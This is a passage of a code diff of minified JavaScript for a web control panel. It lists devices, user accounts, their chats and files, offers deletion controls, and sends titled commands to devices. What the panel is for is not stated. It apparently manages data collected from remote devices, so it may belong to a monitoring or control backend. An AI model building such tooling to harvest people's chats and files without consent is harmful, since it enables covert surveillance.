p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
+$("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;state.peer=null;await loadAccount();renderMain();return}const conv=e.target.closest("[data-peer]");if(conv){state.peer=conv.dataset.peer;renderChats();return}if(e.target.id==="backChats"){state.peer=null;renderChats();return}if(e.target.id==="deleteConversation")return deleteConversation();if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
 $("sendCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:$("cmdTitle").value,text:$("cmdText").value,action:$("cmdAction").value,activity:$("cmdActivity").value})});$("sendCommand").textContent="Sent";setTimeout(()=>$("sendCommand").textContent="Send",1200)};
 $("clearCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
 $("closeModal").onclick=()=>$("modal").classList.remove("open");$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
